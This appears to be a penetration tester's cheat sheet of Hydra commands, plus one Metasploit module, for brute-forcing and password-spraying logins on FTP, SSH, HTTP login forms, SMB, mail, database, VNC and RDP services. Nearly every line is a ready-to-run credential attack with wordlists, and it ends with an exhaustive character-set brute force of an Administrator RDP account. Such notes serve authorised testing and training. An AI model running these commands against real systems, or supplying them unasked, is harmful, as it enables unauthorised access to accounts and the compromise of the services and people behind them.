
> [!NOTE] NOTE
> `Medusa` works the exact same way command wise

### Common Services
FTP
```shell
hydra -l admin -P ~/opt/wordlists/2023-200_most_used_passwords.txt ftp://192.168.1.100
```
SSH
```shell
hydra -l root -P ~/opt/wordlists/2023-200_most_used_passwords.txt ssh://192.168.1.100
```
HTTP Authentication
```shell
hydra -L usernames.txt -P passwords.txt www.example.com http-get
```
HTTP GET/POST
```shell
hydra [options] target http-post-form "path:params:condition_string"

hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
```
SMB
```bash
hydra -l admin -P ~/opt/wordlists/2023-200_most_used_passwords.txt smb://192.168.1.100
```
SMBv3
```bash
msf6 > use auxiliary/scanner/smb/smb_login
set user_file user.list
set pass_file password.list
```
SMTP, POP3, IMAP
```shell 
hydra -l admin -P ~/opt/wordlists/2023-200_most_used_passwords.txt smtp://mail.server.com
hydra -l user@adot8.com -P ~/opt/wordlists/2023-200_most_used_passwords.txt pop3://mail.server.com
hydra -l user@adot8.com-P ~/opt/wordlists/2023-200_most_used_passwords.txt imap://mail.server.com
```
MySQL, MSSQL
```shell 
hydra -l root -P ~/opt/wordlists/2023-200_most_used_passwords.txt mysql://192.168.1.100
hydra -l sa -P ~/opt/wordlists/2023-200_most_used_passwords.txt mssql://192.168.1.100
```
VNC, RDP
```shell
hydra -l admin -P ~/opt/wordlists/2023-200_most_used_passwords.txt vnc://192.168.1.100
hydra -l admin -P ~/opt/wordlists/2023-200_most_used_passwords.txt rdp://192.168.1.100
```
### Additional Options
Target multiple targets (password spray scenario)
```shell
hydra -l root -p toor -M targets.txt ssh
```
Non standard port `-s`
```shell
hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
```
Web app login page, successful login code 302 (moved)
```shell
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```
Imagine youre testing `RDP` and you know the username is `Administrator` and the password consists of 6 to 8 characters...
```shell
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```